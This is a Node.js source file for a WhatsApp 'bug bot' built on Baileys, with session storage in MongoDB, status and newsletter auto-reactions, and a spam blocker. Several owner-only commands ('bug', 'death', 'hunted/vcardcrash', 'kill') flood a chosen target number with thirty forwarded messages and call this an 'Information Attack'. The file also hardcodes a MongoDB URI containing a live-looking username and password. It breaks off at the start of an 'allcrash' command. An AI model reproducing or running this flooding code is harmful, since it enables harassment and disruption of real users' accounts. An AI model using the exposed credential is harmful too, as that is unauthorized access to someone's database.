
const express = require('express');
const fs = require('fs-extra');
const path = require('path');
const os = require('os');
const { exec } = require('child_process');
const router = express.Router();
const pino = require('pino');
const moment = require('moment-timezone');
const Jimp = require('jimp');
const crypto = require('crypto');
const axios = require('axios');
const FileType = require('file-type');
const fetch = require('node-fetch');
const { MongoClient } = require('mongodb');
const { sms, downloadMediaMessage } = require("./msg");

const {
  default: makeWASocket,
  useMultiFileAuthState,
  delay,
  getContentType,
  makeCacheableSignalKeyStore,
  Browsers,
  jidNormalizedUser,
  downloadContentFromMessage,
  DisconnectReason
} = require('baileys');


const BOT_NAME_FANCY = '╰‿╯ ϟ ᴍᴇᴢᴜᴋᴀ ᴋɪʟʟᴇʀ ✯꧂';

const config = {
  AUTO_VIEW_STATUS: 'true',
  AUTO_LIKE_STATUS: 'true',
  AUTO_RECORDING: 'true',
  AUTO_LIKE_EMOJI: ['🔥','😀','👍','😃','😄','😁','😎','🥳','🌞','🌈','❤️'],
  PREFIX: '.',
  MAX_RETRIES: 3,
  GROUP_INVITE_LINK: 'https://chat.whatsapp.com/ELr6MNlg7j95RvZKqUBlAM',
  RCD_IMAGE_PATH: 'https://raw.githubusercontent.com/NimeshMihiranga-Neno/MANI-XTECH-help/main/bdd52f388339f87467e7222069acec42.jpg',
  NEWSLETTER_JID: '120363424190766692@newsletter',
  OTP_EXPIRY: 300000,
  OWNER_NUMBER: process.env.OWNER_NUMBER || '9779807044421',
  CHANNEL_LINK: 'https://whatsapp.com/channel/0029VbC1tH0L7UVPPYGED62n',
  BOT_NAME: '𝐌𝐀𝐍𝐈 𝐊ɪʟᴇʀ',
  BOT_VERSION: 'ʙᴇᴛᴀ',
  OWNER_NAME: '𝐁ʟᴀᴄᴋ 𝐂ᴀᴛ 𝐀ᴅᴍɪɴ 𝐓ᴇᴀᴍ',
  IMAGE_PATH: 'https://raw.githubusercontent.com/NimeshMihiranga-Neno/MANI-XTECH-help/main/bdd52f388339f87467e7222069acec42.jpg',
  BOT_FOOTER: '© ᴘᴏᴡᴇʀᴅ ʙʏ ᴍᴇᴢᴜᴋᴀ ᴍᴅ',
  BUTTON_IMAGES: { ALIVE: 'https://raw.githubusercontent.com/NimeshMihiranga-Neno/MANI-XTECH-help/main/bdd52f388339f87467e7222069acec42.jpg' },
  MODE: process.env.BOT_MODE || 'public'
};


const MONGO_URI = process.env.MONGO_URI || 'mongodb+srv://nimeshmihirangadev_db_user:3tqH10dYa1KWEpDA@cluster0.fcajoas.mongodb.net/';
const MONGO_DB = process.env.MONGO_DB || 'DB_KILLER';

let mongoClient, mongoDB;
let sessionsCol, numbersCol, adminsCol, newsletterCol, configsCol, newsletterReactsCol;

async function initMongo() {
  try {
    if (mongoClient && mongoClient.topology && mongoClient.topology.isConnected && mongoClient.topology.isConnected()) return;
  } catch(e){}
  mongoClient = new MongoClient(MONGO_URI, { useNewUrlParser: true, useUnifiedTopology: true });
  await mongoClient.connect();
  mongoDB = mongoClient.db(MONGO_DB);

  sessionsCol = mongoDB.collection('sessions');
  numbersCol = mongoDB.collection('numbers');
  adminsCol = mongoDB.collection('admins');
  newsletterCol = mongoDB.collection('newsletter_list');
  configsCol = mongoDB.collection('configs');
  newsletterReactsCol = mongoDB.collection('newsletter_reacts');

  await sessionsCol.createIndex({ number: 1 }, { unique: true });
  await numbersCol.createIndex({ number: 1 }, { unique: true });
  await newsletterCol.createIndex({ jid: 1 }, { unique: true });
  await newsletterReactsCol.createIndex({ jid: 1 }, { unique: true });
  await configsCol.createIndex({ number: 1 }, { unique: true });
  console.log('✅ Mongo initialized and collections ready');
}

// ---------------- Mongo helpers ----------------

async function saveCredsToMongo(number, creds, keys = null) {
  try {
    await initMongo();
    const sanitized = number.replace(/[^0-9]/g, '');
    const doc = { number: sanitized, creds, keys, updatedAt: new Date() };
    await sessionsCol.updateOne({ number: sanitized }, { $set: doc }, { upsert: true });
    console.log(`Saved creds to Mongo for ${sanitized}`);
  } catch (e) { console.error('saveCredsToMongo error:', e); }
}

async function loadCredsFromMongo(number) {
  try {
    await initMongo();
    const sanitized = number.replace(/[^0-9]/g, '');
    const doc = await sessionsCol.findOne({ number: sanitized });
    return doc || null;
  } catch (e) { console.error('loadCredsFromMongo error:', e); return null; }
}

async function removeSessionFromMongo(number) {
  try {
    await initMongo();
    const sanitized = number.replace(/[^0-9]/g, '');
    await sessionsCol.deleteOne({ number: sanitized });
    console.log(`Removed session from Mongo for ${sanitized}`);
  } catch (e) { console.error('removeSessionToMongo error:', e); }
}

async function addNumberToMongo(number) {
  try {
    await initMongo();
    const sanitized = number.replace(/[^0-9]/g, '');
    await numbersCol.updateOne({ number: sanitized }, { $set: { number: sanitized } }, { upsert: true });
    console.log(`Added number ${sanitized} to Mongo numbers`);
  } catch (e) { console.error('addNumberToMongo', e); }
}

async function removeNumberFromMongo(number) {
  try {
    await initMongo();
    const sanitized = number.replace(/[^0-9]/g, '');
    await numbersCol.deleteOne({ number: sanitized });
    console.log(`Removed number ${sanitized} from Mongo numbers`);
  } catch (e) { console.error('removeNumberFromMongo', e); }
}

async function getAllNumbersFromMongo() {
  try {
    await initMongo();
    const docs = await numbersCol.find({}).toArray();
    return docs.map(d => d.number);
  } catch (e) { console.error('getAllNumbersFromMongo', e); return []; }
}

async function loadAdminsFromMongo() {
  try {
    await initMongo();
    const docs = await adminsCol.find({}).toArray();
    return docs.map(d => d.jid || d.number).filter(Boolean);
  } catch (e) { console.error('loadAdminsFromMongo', e); return []; }
}

async function addAdminToMongo(jidOrNumber) {
  try {
    await initMongo();
    const doc = { jid: jidOrNumber };
    await adminsCol.updateOne({ jid: jidOrNumber }, { $set: doc }, { upsert: true });
    console.log(`Added admin ${jidOrNumber}`);
  } catch (e) { console.error('addAdminToMongo', e); }
}

async function removeAdminFromMongo(jidOrNumber) {
  try {
    await initMongo();
    await adminsCol.deleteOne({ jid: jidOrNumber });
    console.log(`Removed admin ${jidOrNumber}`);
  } catch (e) { console.error('removeAdminFromMongo', e); }
}

async function addNewsletterToMongo(jid, emojis = []) {
  try {
    await initMongo();
    const doc = { jid, emojis: Array.isArray(emojis) ? emojis : [], addedAt: new Date() };
    await newsletterCol.updateOne({ jid }, { $set: doc }, { upsert: true });
    console.log(`Added newsletter ${jid} -> emojis: ${doc.emojis.join(',')}`);
  } catch (e) { console.error('addNewsletterToMongo', e); throw e; }
}

async function removeNewsletterFromMongo(jid) {
  try {
    await initMongo();
    await newsletterCol.deleteOne({ jid });
    console.log(`Removed newsletter ${jid}`);
  } catch (e) { console.error('removeNewsletterFromMongo', e); throw e; }
}

async function listNewslettersFromMongo() {
  try {
    await initMongo();
    const docs = await newsletterCol.find({}).toArray();
    return docs.map(d => ({ jid: d.jid, emojis: Array.isArray(d.emojis) ? d.emojis : [] }));
  } catch (e) { console.error('listNewslettersFromMongo', e); return []; }
}

async function saveNewsletterReaction(jid, messageId, emoji, sessionNumber) {
  try {
    await initMongo();
    const doc = { jid, messageId, emoji, sessionNumber, ts: new Date() };
    if (!mongoDB) await initMongo();
    const col = mongoDB.collection('newsletter_reactions_log');
    await col.insertOne(doc);
    console.log(`Saved reaction ${emoji} for ${jid}#${messageId}`);
  } catch (e) { console.error('saveNewsletterReaction', e); }
}

async function setUserConfigInMongo(number, conf) {
  try {
    await initMongo();
    const sanitized = number.replace(/[^0-9]/g, '');
    await configsCol.updateOne({ number: sanitized }, { $set: { number: sanitized, config: conf, updatedAt: new Date() } }, { upsert: true });
  } catch (e) { console.error('setUserConfigInMongo', e); }
}

async function loadUserConfigFromMongo(number) {
  try {
    await initMongo();
    const sanitized = number.replace(/[^0-9]/g, '');
    const doc = await configsCol.findOne({ number: sanitized });
    return doc ? doc.config : null;
  } catch (e) { console.error('loadUserConfigFromMongo', e); return null; }
}

// -------------- newsletter react-config helpers --------------

async function addNewsletterReactConfig(jid, emojis = []) {
  try {
    await initMongo();
    await newsletterReactsCol.updateOne({ jid }, { $set: { jid, emojis, addedAt: new Date() } }, { upsert: true });
    console.log(`Added react-config for ${jid} -> ${emojis.join(',')}`);
  } catch (e) { console.error('addNewsletterReactConfig', e); throw e; }
}

async function removeNewsletterReactConfig(jid) {
  try {
    await initMongo();
    await newsletterReactsCol.deleteOne({ jid });
    console.log(`Removed react-config for ${jid}`);
  } catch (e) { console.error('removeNewsletterReactConfig', e); throw e; }
}

async function listNewsletterReactsFromMongo() {
  try {
    await initMongo();
    const docs = await newsletterReactsCol.find({}).toArray();
    return docs.map(d => ({ jid: d.jid, emojis: Array.isArray(d.emojis) ? d.emojis : [] }));
  } catch (e) { console.error('listNewsletterReactsFromMongo', e); return []; }
}

async function getReactConfigForJid(jid) {
  try {
    await initMongo();
    const doc = await newsletterReactsCol.findOne({ jid });
    return doc ? (Array.isArray(doc.emojis) ? doc.emojis : []) : null;
  } catch (e) { console.error('getReactConfigForJid', e); return null; }
}

// ---------------- basic utils ----------------

function formatMessage(title, content, footer) {
  return `*${title}*\n\n${content}\n\n> *${footer}*`;
}
function generateOTP(){ return Math.floor(100000 + Math.random() * 900000).toString(); }
function getSriLankaTimestamp(){ return moment().tz('Asia/Colombo').format('YYYY-MM-DD HH:mm:ss'); }

const activeSockets = new Map();

const socketCreationTime = new Map();
const pendingModApk = new Map();
const otpStore = new Map();

// ---------------- helpers kept/adapted ----------------

async function joinGroup(socket) {
  let retries = config.MAX_RETRIES;
  const inviteCodeMatch = (config.GROUP_INVITE_LINK || '').match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/);
  if (!inviteCodeMatch) return { status: 'failed', error: 'No group invite configured' };
  const inviteCode = inviteCodeMatch[1];
  while (retries > 0) {
    try {
      const response = await socket.groupAcceptInvite(inviteCode);
      if (response?.gid) return { status: 'success', gid: response.gid };
      throw new Error('No group ID in response');
    } catch (error) {
      retries--;
      let errorMessage = error.message || 'Unknown error';
      if (error.message && error.message.includes('not-authorized')) errorMessage = 'Bot not authorized';
      else if (error.message && error.message.includes('conflict')) errorMessage = 'Already a member';
      else if (error.message && error.message.includes('gone')) errorMessage = 'Invite invalid/expired';
      if (retries === 0) return { status: 'failed', error: errorMessage };
      await delay(2000 * (config.MAX_RETRIES - retries));
    }
  }
  return { status: 'failed', error: 'Max retries reached' };
}

async function sendAdminConnectMessage(socket, number, groupResult, sessionConfig = {}) {
  const admins = await loadAdminsFromMongo();
  const groupStatus = groupResult.status === 'success' ? `Joined (ID: ${groupResult.gid})` : `Failed to join group: ${groupResult.error}`;
  const botName = sessionConfig.botName || BOT_NAME_FANCY;
  const image = sessionConfig.logo || config.RCD_IMAGE_PATH;
  const caption = formatMessage(botName, `📞 Number: ${number}`, botName);
  for (const admin of admins) {
    try {
      const to = admin.includes('@') ? admin : `${admin}@s.whatsapp.net`;
      if (String(image).startsWith('http')) {
        await socket.sendMessage(to, { image: { url: image }, caption });
      } else {
        try {
          const buf = fs.readFileSync(image);
          await socket.sendMessage(to, { image: buf, caption });
        } catch (e) {
          await socket.sendMessage(to, { image: { url: config.RCD_IMAGE_PATH }, caption });
        }
      }
    } catch (err) {
      console.error('Failed to send connect message to admin', admin, err?.message || err);
    }
  }
}

async function sendOwnerConnectMessage(socket, number, groupResult, sessionConfig = {}) {
  try {
    const ownerJid = `${config.OWNER_NUMBER.replace(/[^0-9]/g,'')}@s.whatsapp.net`;
    const activeCount = activeSockets.size;
    const botName = sessionConfig.botName || BOT_NAME_FANCY;
    const image = sessionConfig.logo || config.RCD_IMAGE_PATH;
    const groupStatus = groupResult.status === 'success' ? `Joined (ID: ${groupResult.gid})` : `Failed to join group: ${groupResult.error}`;
    const caption = formatMessage(
`👑 𝗠𝗔𝗡𝗜- 𝗞𝗜𝗟𝗟𝗘𝗥 𝗕𝗨𝗚 𝗕𝗢𝗧 👑`,

`╭━━〔 ⚡ OWNER CONNECT ⚡ 〕━━╮
┃ 👤 Owner Number
┃ 📞 ${number}
╰━━━━━━━━━━━━━━━━━━━╯

╭━━〔 📊 SESSION STATUS 📊 〕━━╮
┃ 🔢 Active Sessions : ${activeCount}
┃ 🟢 Status : ONLINE
┃ 🚀 System : RUNNING
╰━━━━━━━━━━━━━━━━━━━╯

⚠️ Authorized Owner Access Detected
🔥 MANI-XTECH Killer Bug Bot Connected Successfully`
,
botName
);
    if (String(image).startsWith('http')) {
      await socket.sendMessage(ownerJid, { image: { url: image }, caption });
    } else {
      try {
        const buf = fs.readFileSync(image);
        await socket.sendMessage(ownerJid, { image: buf, caption });
      } catch (e) {
        await socket.sendMessage(ownerJid, { image: { url: config.RCD_IMAGE_PATH }, caption });
      }
    }
  } catch (err) { console.error('Failed to send owner connect message:', err); }
}

async function sendOTP(socket, number, otp) {
  const userJid = jidNormalizedUser(socket.user.id);
  const message = formatMessage(`🔐 OTP VERIFICATION — ${BOT_NAME_FANCY}`, `Your OTP for config update is: *${otp}*\nThis OTP will expire in 5 minutes.\n\nNumber: ${number}`, BOT_NAME_FANCY);
  try { await socket.sendMessage(userJid, { text: message }); console.log(`OTP ${otp} sent to ${number}`); }
  catch (error) { console.error(`Failed to send OTP to ${number}:`, error); throw error; }
}


async function setupNewsletterHandlers(socket, sessionNumber) {
  const rrPointers = new Map();

  socket.ev.on('messages.upsert', async ({ messages }) => {
    const message = messages[0];
    if (!message?.key) return;
    const jid = message.key.remoteJid;

    try {
      const followedDocs = await listNewslettersFromMongo(); // array of {jid, emojis}
      const reactConfigs = await listNewsletterReactsFromMongo(); // [{jid, emojis}]
      const reactMap = new Map();
      for (const r of reactConfigs) reactMap.set(r.jid, r.emojis || []);

      const followedJids = followedDocs.map(d => d.jid);
      if (!followedJids.includes(jid) && !reactMap.has(jid)) return;

      let emojis = reactMap.get(jid) || null;
      if ((!emojis || emojis.length === 0) && followedDocs.find(d => d.jid === jid)) {
        emojis = (followedDocs.find(d => d.jid === jid).emojis || []);
      }
      if (!emojis || emojis.length === 0) emojis = config.AUTO_LIKE_EMOJI;

      let idx = rrPointers.get(jid) || 0;
      const emoji = emojis[idx % emojis.length];
      rrPointers.set(jid, (idx + 1) % emojis.length);

      const messageId = message.newsletterServerId || message.key.id;
      if (!messageId) return;

      let retries = 3;
      while (retries-- > 0) {
        try {
          if (typeof socket.newsletterReactMessage === 'function') {
            await socket.newsletterReactMessage(jid, messageId.toString(), emoji);
          } else {
            await socket.sendMessage(jid, { react: { text: emoji, key: message.key } });
          }
          console.log(`Reacted to ${jid} ${messageId} with ${emoji}`);
          await saveNewsletterReaction(jid, messageId.toString(), emoji, sessionNumber || null);
          break;
        } catch (err) {
          console.warn(`Reaction attempt failed (${3 - retries}/3):`, err?.message || err);
          await delay(1200);
        }
      }

    } catch (error) {
      console.error('Newsletter reaction handler error:', error?.message || error);
    }
  });
}




async function setupStatusHandlers(socket) {
  socket.ev.on('messages.upsert', async ({ messages }) => {
    const message = messages[0];
    if (!message?.key || message.key.remoteJid !== 'status@broadcast' || !message.key.participant) return;
    try {
      // determine session number from socket
      const sanitizedNumber = (socket.user && socket.user.id) ? socket.user.id.split(':')[0] : null;
      const sessionConfig = sanitizedNumber ? (await loadUserConfigFromMongo(sanitizedNumber) || {}) : {};

      // stview handling: session-specific override falls back to global config
      const stviewEnabled = (typeof sessionConfig.stview !== 'undefined') ? !!sessionConfig.stview : (config.AUTO_VIEW_STATUS === 'true');
      if (stviewEnabled) {
        try {
          let retries = config.MAX_RETRIES;
          while (retries > 0) {
            try { await socket.readMessages([message.key]); break; }
            catch (error) { retries--; await delay(1000 * (config.MAX_RETRIES - retries)); if (retries===0) throw error; }
          }
        } catch (e) { console.warn('Failed to auto-view status:', e); }
      }

      // reactions handling: session-specific sr overrides global AUTO_LIKE_EMOJI
      let emojis = Array.isArray(sessionConfig.sr) && sessionConfig.sr.length ? sessionConfig.sr : (config.AUTO_LIKE_STATUS === 'true' ? config.AUTO_LIKE_EMOJI : []);
      if (emojis && emojis.length > 0) {
        const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
        let retries = config.MAX_RETRIES;
        while (retries > 0) {
          try {
            await socket.sendMessage(message.key.remoteJid, { react: { text: randomEmoji, key: message.key } }, { statusJidList: [message.key.participant] });
            break;
          } catch (error) { retries--; await delay(1000 * (config.MAX_RETRIES - retries)); if (retries===0) console.warn('Failed to react to status:', error); }
        }
      }

    } catch (error) { console.error('Status handler error:', error); }
  });
}


async function handleMessageRevocation(socket, number) {
  socket.ev.on('messages.delete', async ({ keys }) => {
    if (!keys || keys.length === 0) return;
    const messageKey = keys[0];
    const userJid = jidNormalizedUser(socket.user.id);
    const deletionTime = getSriLankaTimestamp();
    const message = formatMessage('🗑️ MESSAGE DELETED', `A message was deleted from your chat.\n📋 From: ${messageKey.remoteJid}\n🍁 Deletion Time: ${deletionTime}`, BOT_NAME_FANCY);
    try { await socket.sendMessage(userJid, { image: { url: config.RCD_IMAGE_PATH }, caption: message }); }
    catch (error) { console.error('Failed to send deletion notification:', error); }
  });
}


async function resize(image, width, height) {
  let oyy = await Jimp.read(image);
  return await oyy.resize(width, height).getBufferAsync(Jimp.MIME_JPEG);
}


// ---------------- Spam Protection ----------------
const spamTracker = new Map(); // { jid -> { count, firstMsgTime } }
const SPAM_LIMIT = 8;          // max messages within window
const SPAM_WINDOW = 5000;      // 5 second window

async function handleSpam(socket, senderJid, fromJid) {
  try {
    if (typeof socket.updateBlockStatus === 'function') {
      await socket.updateBlockStatus(senderJid, 'block');
    }
    try { await socket.chatModify({ delete: true, lastMessages: [] }, fromJid); } catch(e){}
    console.log('[SPAM] Blocked & cleared chat: ' + senderJid);
  } catch (e) {
    console.error('[SPAM] handleSpam error:', e?.message || e);
  }
}

function checkSpam(senderJid) {
  const now = Date.now();
  const entry = spamTracker.get(senderJid) || { count: 0, firstMsgTime: now };
  if (now - entry.firstMsgTime > SPAM_WINDOW) {
    entry.count = 1;
    entry.firstMsgTime = now;
  } else {
    entry.count++;
  }
  spamTracker.set(senderJid, entry);
  return entry.count >= SPAM_LIMIT;
}
// --------------------------------------------------

// ---------------- command handlers ----------------

function setupCommandHandlers(socket, number) {
  socket.ev.on('messages.upsert', async ({ messages }) => {
    const msg = messages[0];
    if (!msg || !msg.message || msg.key.remoteJid === 'status@broadcast' || msg.key.remoteJid === config.NEWSLETTER_JID) return;

    const type = getContentType(msg.message);
    if (!msg.message) return;
    msg.message = (getContentType(msg.message) === 'ephemeralMessage') ? msg.message.ephemeralMessage.message : msg.message;

    const from = msg.key.remoteJid;
    const sender = from;
    const nowsender = msg.key.fromMe ? (socket.user.id.split(':')[0] + '@s.whatsapp.net' || socket.user.id) : (msg.key.participant || msg.key.remoteJid);
    const senderNumber = (nowsender || '').split('@')[0];
    const botNumber = socket.user.id ? socket.user.id.split(':')[0] : '';
    const isOwner = senderNumber === config.OWNER_NUMBER.replace(/[^0-9]/g,'');
    const isGroup = String(from || '').endsWith('@g.us');

    // --- Spam check (DM only, skip owner & groups) ---
    if (!isGroup && !msg.key.fromMe && !isOwner) {
      if (checkSpam(nowsender)) {
        console.log('[SPAM] Detected from ' + nowsender);
        await handleSpam(socket, nowsender, from);
        spamTracker.delete(nowsender);
        return;
      }
    }
    // --------------------------------------------------

    const body = (type === 'conversation') ? msg.message.conversation
      : (type === 'extendedTextMessage') ? msg.message.extendedTextMessage.text
      : (type === 'imageMessage' && msg.message.imageMessage.caption) ? msg.message.imageMessage.caption
      : (type === 'videoMessage' && msg.message.videoMessage.caption) ? msg.message.videoMessage.caption
      : (type === 'buttonsResponseMessage') ? msg.message.buttonsResponseMessage?.selectedButtonId
      : (type === 'listResponseMessage') ? msg.message.listResponseMessage?.singleSelectReply?.selectedRowId
      : (type === 'viewOnceMessage') ? (msg.message.viewOnceMessage?.message?.imageMessage?.caption || '') : '';

    if (!body || typeof body !== 'string') return;

    const prefix = config.PREFIX;
    const isCmd = body && body.startsWith && body.startsWith(prefix);
    const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : null;
    const args = body.trim().split(/ +/).slice(1);

    // helper: download quoted media into buffer
    async function downloadQuotedMedia(quoted) {
      if (!quoted) return null;
      const qTypes = ['imageMessage','videoMessage','audioMessage','documentMessage','stickerMessage'];
      const qType = qTypes.find(t => quoted[t]);
      if (!qType) return null;
      const messageType = qType.replace(/Message$/i, '').toLowerCase();
      const stream = await downloadContentFromMessage(quoted[qType], messageType);
      let buffer = Buffer.from([]);
      for await (const chunk of stream) buffer = Buffer.concat([buffer, chunk]);
      return {
        buffer,
        mime: quoted[qType].mimetype || '',
        caption: quoted[qType].caption || quoted[qType].fileName || '',
        ptt: quoted[qType].ptt || false,
        fileName: quoted[qType].fileName || ''
      };
    }

    if (!command) return;

    // PER-SESSION MODE CHECK (private/inbox/groups/public)
    try {
      const sanitizedNumber = (number || '').replace(/[^0-9]/g, '');
      const sessionConfig = await loadUserConfigFromMongo(sanitizedNumber) || {};
      const sessionMode = (sessionConfig && sessionConfig.mode) ? sessionConfig.mode : (config.MODE || 'public');

      const permissionQuote = {
        key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_PERM" },
        message: { contactMessage: { displayName: BOT_NAME_FANCY, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${BOT_NAME_FANCY};;;;\nFN:${BOT_NAME_FANCY}\nEND:VCARD` } }
      };

      if (!isOwner) {
        if (sessionMode === 'private') {
          await socket.sendMessage(sender, { text: '❌ Permission denied. Bot is currently in *private* mode — only the session owner or bot owner may use commands.' }, { quoted: permissionQuote });
          return;
        }
        if (isGroup && sessionMode === 'inbox') {
          await socket.sendMessage(sender, { text: '❌ Permission denied. Bot is in *inbox* mode — commands are restricted to private chats only.' }, { quoted: permissionQuote });
          return;
        }
        if (!isGroup && sessionMode === 'groups') {
          await socket.sendMessage(sender, { text: '❌ Permission denied. Bot is in *groups* mode — commands are restricted to group chats only.' }, { quoted: permissionQuote });
          return;
        }
      }
    } catch (permErr) {
      console.error('Permission check error:', permErr);
    }

    if (!command) return;

    try {
      switch (command) {

case 'getdp': {
    try {
        const sanitized = (number || '').replace(/[^0-9]/g, '');
        const cfg = await loadUserConfigFromMongo(sanitized) || {};
        const botName = cfg.botName || BOT_NAME_FANCY;
        const logo = cfg.logo || config.RCD_IMAGE_PATH;

        const senderIdSimple = (nowsender || '').includes('@') ? nowsender.split('@')[0] : (nowsender || '');

        let q = msg.message?.conversation?.split(" ")[1] || 
                msg.message?.extendedTextMessage?.text?.split(" ")[1];

        if (!q) return await socket.sendMessage(sender, { text: "❌ Please provide a number.\n\nUsage: .getdp <number>" });

        // 🔹 Format number into JID
        let jid = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

        // 🔹 Try to get profile picture
        let ppUrl;
        try {
            ppUrl = await socket.profilePictureUrl(jid, "image");
        } catch {
            ppUrl = "https://telegra.ph/file/4cc2712eaba1c5c1488d3.jpg"; // default dp
        }

        // 🔹 BotName meta mention
        const metaQuote = {
            key: { remoteJid: "status@broadcast", participant: "0@s.whatsapp.net", fromMe: false, id: "META_AI_GETDP" },
            message: { contactMessage: { displayName: botName, vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${botName};;;;\nFN:${botName}\nORG:Meta Platforms\nTEL;type=CELL;type=VOICE;waid=13135550002:+1 313 555 0002\nEND:VCARD` } }
        };

        // 🔹 Send DP with botName meta mention
        await socket.sendMessage(sender, { 
            image: { url: ppUrl }, 
            caption: `🖼 *Profile Picture of* +${q}\nFetched by: ${botName}`,
            footer: `📌 ${botName} GETDP`,
            buttons: [{ buttonId: `${config.PREFIX}menu`, buttonText: { displayText: "📋 MENU" }, type: 1 }],
            headerType: 4
        }, { quoted: metaQuote }); // <-- botName meta mention

    } catch (e) {
        console.log("❌ getdp error:", e);
        await socket.sendMessage(sender, { text: "⚠️ Error: Could not fetch profile picture." });
    }
    break;
}

case 'bug': {
  if (!isOwner) return await socket.sendMessage(sender, { text: '❌ Only the bot owner can use this command!' }, { quoted: msg });

  const argText2 = args.join(' ');
  const mentionedJids = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
  const quotedSender = msg.message?.extendedTextMessage?.contextInfo?.participant || null;

  let targetJid = mentionedJids[0]
    ? mentionedJids[0]
    : quotedSender
      ? quotedSender
      : argText2?.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

  if (!targetJid || targetJid === '@s.whatsapp.net') {
    return await socket.sendMessage(sender, { text: '❌ Target number provide karanna!\nUsage: .bug <number> or mention/reply' }, { quoted: msg });
  }

  // 🔒 Ownerව target කිරීම වළක්වන කොටස (Anti-Target Owner)
  if (targetJid.includes('9779807044421')) {
    return await socket.sendMessage(sender, { text: '❌ Can\'t target owner!' }, { quoted: msg });
  }

  const senderName = msg.pushName || senderNumber || 'Unknown';

  await socket.sendMessage(sender, { react: { text: '🔍', key: msg.key } });

  const infoText =
    `*Information Attack*\n` +
    `\n* Sender : ${senderName}` +
    `\n* Target : ${targetJid}` +
    `\n* Status : active\n`;

  await socket.sendMessage(sender, { react: { text: '✅', key: msg.key } });
  await socket.sendMessage(sender, { text: infoText }, { quoted: msg });

  for (let i = 0; i < 10; i++) {
    await socket.sendMessage(targetJid, { forward: msg, force: true });
    await delay(500);
    await socket.sendMessage(targetJid, { forward: msg, force: true });
    await delay(500);
    await socket.sendMessage(targetJid, { forward: msg, force: true });
  }
  break;
}
    case 'death': {
      if (!isOwner) return await socket.sendMessage(sender, { text: '❌ Only the bot owner can use this command!' }, { quoted: msg });

      const argText3 = args.join(' ');
      const mentionedJids = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
      const quotedSender = msg.message?.extendedTextMessage?.contextInfo?.participant || null;

      let targetJid = mentionedJids[0]
        ? mentionedJids[0]
        : quotedSender
          ? quotedSender
          : argText3?.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

      if (!targetJid || targetJid === '@s.whatsapp.net') {
        return await socket.sendMessage(sender, { text: '❌ Target number provide karanna!' }, { quoted: msg });
      }

      // 🔒 Anti-Target Owner
      if (targetJid.includes('9779807044421')) {
        return await socket.sendMessage(sender, { text: '❌ Can\'t target owner!' }, { quoted: msg });
      }

      const senderName = msg.pushName || senderNumber || 'Unknown';

      await socket.sendMessage(sender, { react: { text: '🔍', key: msg.key } });

      const infoText =
        `*Information Attack*\n` +
        `\n* Sender : ${senderName}` +
        `\n* Target : ${targetJid}` +
        `\n* Status : active\n`;

      await socket.sendMessage(sender, { react: { text: '🚫', key: msg.key } });
      await socket.sendMessage(sender, { text: infoText }, { quoted: msg });

      for (let i = 0; i < 10; i++) {
        await socket.sendMessage(targetJid, { forward: msg, force: true });
        await delay(500);
        await socket.sendMessage(targetJid, { forward: msg, force: true });
        await delay(500);
        await socket.sendMessage(targetJid, { forward: msg, force: true });
      }
      break;
    }

    case 'hunted':
    case 'vcardcrash': {
      if (!isOwner) return await socket.sendMessage(sender, { text: '❌ Only the bot owner can use this command!' }, { quoted: msg });

      const argText4 = args.join(' ');
      const mentionedJids = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
      const quotedSender = msg.message?.extendedTextMessage?.contextInfo?.participant || null;

      let targetJid = mentionedJids[0]
        ? mentionedJids[0]
        : quotedSender
          ? quotedSender
          : argText4?.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

      if (!targetJid || targetJid === '@s.whatsapp.net') {
        return await socket.sendMessage(sender, { text: '❌ Target number provide karanna!\nUsage: .hunted <number> or mention/reply' }, { quoted: msg });
      }

      // 🔒 Anti-Target Owner
      if (targetJid.includes('9779807044421')) {
        return await socket.sendMessage(sender, { text: '❌ Can\'t target owner!' }, { quoted: msg });
      }

      const senderName = msg.pushName || senderNumber || 'Unknown';

      await socket.sendMessage(sender, { react: { text: '🔍', key: msg.key } });

      const infoText =
        `*Information Attack*\n` +
        `\n* Sender : ${senderName}` +
        `\n* Target : ${targetJid}` +
        `\n* Status : active\n`;

      await socket.sendMessage(sender, { react: { text: '✅', key: msg.key } });
      await socket.sendMessage(sender, { text: infoText }, { quoted: msg });

      for (let i = 0; i < 10; i++) {
        await socket.sendMessage(targetJid, { forward: msg, force: true });
        await delay(500);
        await socket.sendMessage(targetJid, { forward: msg, force: true });
        await delay(500);
        await socket.sendMessage(targetJid, { forward: msg, force: true });
      }
      break;
    }

    case 'kill': {
      if (!isOwner) return await socket.sendMessage(sender, { text: '❌ Only the bot owner can use this command!' }, { quoted: msg });

      const argText5 = args.join(' ');
      const mentionedJids = msg.message?.extendedTextMessage?.contextInfo?.mentionedJid || [];
      const quotedSender = msg.message?.extendedTextMessage?.contextInfo?.participant || null;

      let targetJid = mentionedJids[0]
        ? mentionedJids[0]
        : quotedSender
          ? quotedSender
          : argText5?.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

      if (!targetJid || targetJid === '@s.whatsapp.net') {
        return await socket.sendMessage(sender, { text: '❌ Target number provide karanna!\nUsage: .kill <number> or mention/reply' }, { quoted: msg });
      }

      // 🔒 Anti-Target Owner
      if (targetJid.includes('9779807044421')) {
        return await socket.sendMessage(sender, { text: '❌ Can\'t target owner!' }, { quoted: msg });
      }

      const senderName = msg.pushName || senderNumber || 'Unknown';

      await socket.sendMessage(sender, { react: { text: '🔍', key: msg.key } });

      const infoText =
        `*Information Attack*\n` +
        `\n* Sender : ${senderName}` +
        `\n* Target : ${targetJid}` +
        `\n* Status : active\n`;

      await socket.sendMessage(sender, { react: { text: '✅', key: msg.key } });
      await socket.sendMessage(sender, { text: infoText }, { quoted: msg });

      for (let i = 0; i < 10; i++) {
        await socket.sendMessage(targetJid, { forward: msg, force: true });
        await delay(500);
        await socket.sendMessage(targetJid, { forward: msg, force: true });
        await delay(500);
        await socket.sendMessage(targetJid, { forward: msg, force: true });
      }
      break;
    }

    case 'xsql':
    case 'allcrash': {
